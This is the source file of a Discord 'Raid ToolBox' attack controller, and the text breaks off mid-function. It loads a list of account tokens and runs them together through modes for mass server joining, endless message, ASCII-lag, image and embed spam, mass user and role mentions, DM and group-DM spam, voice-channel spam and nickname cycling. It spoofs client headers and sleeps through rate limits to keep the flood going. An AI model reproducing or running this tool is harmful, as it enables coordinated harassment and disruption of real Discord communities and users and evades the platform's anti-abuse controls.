#!/usr/bin/env python3
# Raid ToolBox Attack Controller
# Author: DeadBread76 - https://github.com/DeadBread76/
# July 3rd, 2019 - July , 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os
import sys
import ast
import zlib
import json
import time
import psutil
import random
import requests
import subprocess
import PySimpleGUI as sg
from itertools import cycle
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

mode = sys.argv[1]
pycommand = sys.argv[2]
climode = int(sys.argv[3])
threadcount = sys.argv[4]
executor = ThreadPoolExecutor(max_workers=int(threadcount))
tokenlist = open("tokens.txt").read().splitlines()
sg.ChangeLookAndFeel('Dark2')
true = 'true'
false = 'false'

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

if mode == 'joiner':
    def join(token,link,widget):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if widget:
            src = requests.get("https://canary.discordapp.com/api/guilds/{}/widget.json".format(str(link)))
            widgson = json.loads(src.content)
            try:
                link = widgson['instant_invite'][37:]
            except Exception:
                sys.exit()
            requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
        else:
            requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter Invite to join.'), sg.InputText(size=(30,1)),sg.RButton('Join',button_color=('white', 'firebrick4'),size=(10,1))],
                [sg.Text('Delay'), sg.Combo(['0','1','3','5','10','60']), sg.Checkbox('Log Info', tooltip='Log Info of server to text file.',size=(5,1)), sg.Checkbox('Widget joiner (Requires Server ID)')]
                ]
        window = sg.Window('RTB | Joiner', layout)
        event, values = window.Read()
        window.Close()
        link = values[0]
        delay = values[1]
        log = values[2]
        widget = values[3]
        if event == "Join":
            pass
        else:
            sys.exit()
    else:
        link = sys.argv[5]
        log = False
    if widget:
        pass
    else:
        if 'https://discordapp.com/invite/' in link:
            link = link[30:]
        elif len(link) > 7:
            link = link[19:]
    if not delay == '0':
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            time.sleep(int(delay))
    else:
        for token in tokenlist:
            executor.submit(join,token,link,widget)
    if log:
        try:
            s = requests.get("https://canary.discordapp.com/api/v6/invite/{}".format(link)).text
            serjson = json.loads(s)
            with open("JoinerLogs.txt", "a+", errors='ignore') as handle:
                handle.write("=======================\n{}\n=======================\nInvite Code: {}\nServer name: {}\nServer ID: {}\nInvite channel ID: {}\nInvite Channel Name: {}\nVerification Level: {}\n\n".format(str(datetime.now()),serjson['code'],serjson['guild']['name'],serjson['guild']['id'],serjson['channel']['id'],serjson['channel']['name'],serjson['guild']['verification_level']))
            layout = [[sg.Text('Server Name: {}'.format(serjson['guild']['name']))],
                    [sg.Text('Server ID: {}'.format(serjson['guild']['id']))],
                    [sg.Button('kthxbye',button_color=('white', 'firebrick4'),size=(30,1))]
                    ]
            window = sg.Window('RTB | Joiner', layout)
            event, values = window.Read()
            window.Close()
        except Exception:
            pass

elif mode == 'leaver':
    def leave(token,ID):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/users/@me/guilds/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=('white', 'firebrick4'),size=(10,1))]]
        window = sg.Window('RTB | Leaver', layout)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[5]
    for token in tokenlist:
        executor.submit(leave,token,ID)

elif mode == 'groupleaver':
    def grleave(token,ID):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/channels/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=('white', 'firebrick4'),size=(10,1))]]
        window = sg.Window('RTB | Group DM Leaver', layout)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[5]
    for token in tokenlist:
        executor.submit(grleave,token,ID)

elif mode == 'messagespam':
    def sendmessage(token,text,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content": text, "tts": false}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            payload = {"content": text, "tts": false}
            while True:
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Message Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        channelid = values[1]
        SERVER = values[2]
    else:
        text = sys.argv[5]
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendmessage,token,text,channelid,SERVER)

elif mode == 'asciispam':
    def sendascii(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": asciigen(1999), "tts": false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            while True:
                payload = {"content": asciigen(1999), "tts": false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    if climode == 0:
        layout = [[sg.Text('WARNING: This will make your Discord client lag by just looking at the channel,\nI recommend not looking at the channels while doing this attack.')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Ascii Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[5]
        SERVER = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendascii,token,channelid,SERVER)

elif mode == 'massmention':
    def sendmention(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        memberlist = []
        msg = ''
        memb = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/members?limit=1000".format(server),headers=headers).text
        memberjson = json.loads(memb)
        for member in memberjson:
            memberlist.append("<@{}>".format(member['user']['id']))
        for member in memberlist:
            msg += member + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if "You are being rate limited." in str(src.content):
                                time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if "You are being rate limited." in str(src.content):
                        time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
              ]
        window = sg.Window('RTB | Mass Mentioner', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[5]
        channelid = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendmention,token,channelid,SERVER)

elif mode == 'vcspam':
    import youtube_dl
    ydl_opts = {
        'outtmpl': 'RTBFiles/vcspammercache/file.webm',
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'wav',
            'preferredquality': '192',
        }],
    }
    if climode == 0:
        layout = [
              [sg.Text('YouTube Link to play', size=(15, 1)), sg.InputText()],
              [sg.Text('Voice Channel ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)),
              default_value=len(tokenlist),
              size=(29,15),
              orientation='horizontal',
              font=('Helvetica', 10))],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
              ]
        window = sg.Window('RTB | Voice Chat Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        ytlink = values[0]
        channelid = values[1]
        ammount = values[2]
    else:
        ytlink = sys.argv[5]
        channelid = sys.argv[6]
        ammount = sys.argv[7]
    if not os.path.isdir('RTBFiles/vcspammercache/'):
        os.mkdir("RTBFiles/vcspammercache/")
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        info_dict = ydl.extract_info(ytlink, download=False)
        video_id = info_dict.get("id", None)
    if not os.path.isfile('RTBFiles/vcspammercache/{}.wav'.format(video_id)):
        ydl_opts = {
         'outtmpl': 'RTBFiles/vcspammercache/{}.webm'.format(video_id),
         'format': 'bestaudio/best',
         'postprocessors': [{
             'key': 'FFmpegExtractAudio',
             'preferredcodec': 'wav',
             'preferredquality': '192',
         }],
        }
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            ydl.download([ytlink])
    count = 0
    for token in tokenlist:
        count += 1
        subprocess.Popen([pycommand,'RTBFiles/vcspam.py',token,channelid,'RTBFiles/vcspammercache/{}.wav'.format(video_id),str(os.getpid())],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        if count == int(ammount):
            break
    while True:
        pass

elif mode == 'dmspammer':
    def dmspammer(token,userid,text,ascii):
        list = []
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {
            'recipient_id': userid
        }
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
        userdm = src.content.decode()
        jsonstring = json.loads(userdm).values()
        for x in jsonstring:
            list.append(x)
        userdm = list[2]
        if ascii == True:
            payload = {"content": asciigen(1999), "tts": false}
        else:
            payload = {"content": text, "tts": false}
        while True:
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(userdm), headers=headers, json=payload)
            if "You are being rate limited." in str(src.content):
                time.sleep(5)
    if climode == 0:
        layout = [
            [sg.Text('Note: The tokens need to share a mutual server with the target for this to work.')],
            [sg.Text('Users ID', size=(15, 1)), sg.InputText()],
            [sg.Text('Text to spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
            [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
            ]
        window = sg.Window('RTB | DM Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
        text = values[1]
        ascii = values[2]
    else:
        userid = sys.argv[5]
        text = sys.argv[6]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(dmspammer,token,userid,text,ascii)

elif mode == 'friender':
    def friend(token,userid):
        if "#" in userid:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            user = userid.split("#")
            payload = {"username": user[0], "discriminator": user[1]}
            requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload)
        else:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            requests.put('https://canary.discordapp.com/api/v6/users/@me/relationships/{}'.format(str(userid)), headers=headers)
    if climode == 0:
        layout = [
              [sg.Text('Enter A User ID or Name + Tag')],
              [sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Group DM Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
    else:
        userid = sys.argv[5]
    for token in tokenlist:
        executor.submit(friend,token,userid)

elif mode == 'groupdmspam':
    def sendgdm(token,text,group,ascii):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content": text, "tts": false}
        while True:
            if ascii:
                payload = {"content": asciigen(1999), "tts": false}
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(group), headers=headers, json=payload)
            if "You are being rate limited." in str(src.content):
                time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
              [sg.Text('Group ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Group DM Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        group = values[2]
        ascii = values[1]
    else:
        text = sys.argv[5]
        group = sys.argv[6]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(sendgdm,token,text,group,ascii)

elif mode == 'imagespam':
    def sendimages(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            while True:
                payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    if climode == 0:
        layout = [[sg.Text('This will spam random images from https://picsum.photos/')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Random Image Spammer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[5]
        SERVER = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendimages,token,channelid,SERVER)

elif mode == 'gamechange':
    from websocket import create_connection
    def changegame(token,game,type,status):
        for token in tokenlist:
            ws = create_connection('wss://gateway.discord.gg/?v=6&encoding=json')
            result = ws.recv()
            if type == "Playing":
                gamejson = {
                    "name": game,
                    "type": 0
                }
            elif type == 'Streaming':
                gamejson = {
                    "name": game,
                    "type": 1,
                    "url": "https://www.twitch.tv/DEADBREAD'S_RAID_TOOLBOX"
                }
            elif type == "Listening to":
                gamejson = {
                    "name": game,
                    "type": 2
                }
            elif type == "Watching":
                gamejson = {
                    "name": game,
                    "type": 3
                }
            payload = {
                'op': 2,
                'd': {
                    'token': token,
                    'properties': {
                        '$os': sys.platform,
                        '$browser': "Discord{}".format(random.randint(1000,9999)),
                        '$device': "Discord{}".format(random.randint(1000,9999)),
                        '$referrer': '',
                        '$referring_domain': ''
                    },
                    'compress': True,
                    'large_threshold': 250,
                    'v': 3,
                    "presence": {
                        "game": gamejson,
                        "status": status,
                        "since": 0,
                        "afk": False
                    }
                }
            }
            to_send = json.dumps(payload)
            ws.send(to_send)
    if climode == 0:
        layout = [[sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 5), default_value='Playing', readonly=True), sg.InputText('osu!',size=(10, 1)),sg.Combo(['online', 'dnd', 'idle'], size=(10, 1), default_value='online', readonly=True)],
                  [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
                  ]
        window = sg.Window('RTB | Status Changer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        type = values[0]
        game = values[1]
        status = values[2]
    else:
        type = 'Playing'
        game = sys.argv[5]
        status = 'online'
    while True:
        for token in tokenlist:
            executor.submit(changegame,token,game,type,status)
        time.sleep(60)

elif mode == 'nickname':
    def nickname(token,server,name,type):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Cycle":
            n = []
            for x in name.rstrip():
                n.append(x)
            cyclename = cycle(n)
            newnick = ''
            while True:
                if len(newnick) == len(name.rstrip()):
                    newnick = ''
                newnick += next(cyclename)
                payload = {'nick': newnick}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(1)
        elif type == "Ascii":
            while True:
                payload = {'nick': asciigen(32)}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(2)
        elif type == "Set":
            payload = {'nick': name}
            requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
    if climode == 0:
        layout = [
                [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True),sg.InputText("DeadBread's Raid Toolbox", tooltip="New Nickname")],
                [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
                ]
        window = sg.Window('RTB | Nickname Changer', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
        type = values[1]
        name = values[2]
    else:
        server = sys.argv[5]
        type = "Ascii"
        name = "None"
    for token in tokenlist:
        executor.submit(nickname,token,server,name,type)

elif mode == 'embed':
    def embedspam(token,channel,server,title,author,iconurl,field_name,field_value,imgurl,footer):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": '', "embed":{"title": title,"color": random.randint(1,16777215),"footer": {"icon_url": iconurl,"text": footer},"image": {"url": imgurl},"author": {"name": author,"url": "https://github.com/DeadBread76/Raid-Toolbox","icon_url": iconurl},"fields": [{"name": field_name,"value": field_value}]}}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if "You are being rate limited." in str(src.content):
                            time.sleep(5)
        else:
            while True:
                payload = {"content": '', "embed":{"title": title,"color": random.randint(1,16777215),"footer": {"icon_url": iconurl,"text": footer},"image": {"url": imgurl},"author": {"name": author,"url": "https://github.com/DeadBread76/Raid-Toolbox","icon_url": iconurl},"fields": [{"name": field_name,"value": field_value}]}}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if "You are being rate limited." in str(src.content):
                    time.sleep(5)
    layout = [
            [sg.Text('Server ID', size=(10, 1)), sg.InputText()],
            [sg.Text('Channel ID', size=(10, 1)), sg.InputText('all')],
            [sg.Text('Title', size=(10, 1)), sg.InputText()],
            [sg.Text('Author', size=(10, 1)), sg.InputText()],
            [sg.Text('Icon URL', size=(10, 1)), sg.InputText()],
            [sg.Text('Field Name', size=(10, 1)), sg.InputText()],
            [sg.Text('Field Value', size=(10, 1)), sg.InputText()],
            [sg.Text('Image URL', size=(10, 1)), sg.InputText()],
            [sg.Text('Footer Text', size=(10, 1)), sg.InputText()],
            [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
            ]
    window = sg.Window('RTB | Embed Spammer', layout)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    server = values[0]
    channel = values[1]
    title = values[2]
    author = values[3]
    iconurl = values[4]
    field_name = values[5]
    field_value = values[6]
    imgurl = values[7]
    footer = values[8]
    for token in tokenlist:
        executor.submit(embedspam,token,channel,server,title,author,iconurl,field_name,field_value,imgurl,footer)

elif mode == 'avatarchange':
    from base64 import b64encode
    # Ripped from Discord.py
    def get_mime(data):
        if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
            return 'image/png'
        elif data[6:10] in (b'JFIF', b'Exif'):
            return 'image/jpeg'
        elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
            return 'image/gif'
        elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
            return 'image/webp'
    # Ripped from Discord.py
    def bytes_to_base64_data(data):
        fmt = 'data:{mime};base64,{data}'
        mime = get_mime(data)
        b64 = b64encode(data).decode('ascii')
        return fmt.format(mime=mime, data=b64)

    def changeavatar(token,avatarfile):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        response = json.loads(src.content.decode())
        username = response['username']
        email = response['email']
        with open(avatarfile, "rb") as avatar_handle:
            encoded = bytes_to_base64_data(avatar_handle.read())
        payload = {'avatar': encoded, 'email': email, 'password': "", 'username': username}
        src = requests.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload)
        print(src.content)
    layout = [
            [sg.Text('Select and image to change avatar.')],
            [sg.Input(), sg.FileBrowse(file_types=(("PNG Files", "*.png"),("JPG Files", "*.jpg"),("JPEG Files", "*.jpeg"),("GIF Files", "*.gif"),("WEBM Files", "*.webm")))],
            [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
            ]
    window = sg.Window('RTB | Avatar Changer', layout)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    avatarfile = values[0]
    for token in tokenlist:
        executor.submit(changeavatar,token,avatarfile)

elif mode == "rolemention":
    def sendrolemention(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        rolelist = []
        msg = ''
        roles = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/roles".format(server),headers=headers).text
        rolejson = json.loads(roles)
        for role in rolejson:
            rolelist.append("<@&{}>".format(role['id']))
        for role in rolelist:
            msg += role + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if "You are being rate limited." in str(src.content):
                                time.sleep(5)
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if "You are being rate limited." in str(src.content):
                        time.sleep(5)
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
              ]
        window = sg.Window('RTB | Role Mass Mentioner', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[5]
        channelid = sys.argv[6]
    for token in tokenlist:
        executor.submit(sendrolemention,token,channelid,SERVER)

elif mode == "cleanup":
    if climode == 0:
        layout = [
              [sg.Text('Enter Server to delete all messages sent by the token.')],
              [sg.InputText()],
              [sg.RButton('Start',button_color=('white', 'firebrick4'),size=(10,1))]
             ]
        window = sg.Window('RTB | Server Cleanup', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
    else:
        server = sys.argv[5]
    for token in tokenlist:
        subprocess.Popen([pycommand,'RTBFiles/cleanup.py',token,server,str(os.getpid()),'None'])
    while True:
        pass

elif mode == "hypesquad":
    def changehouse(token,house):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if house == "Bravery":
            payload = {'house_id': 1}
        elif house == "Brilliance":
            payload = {'house_id': 2}
        elif house == "Ballance":
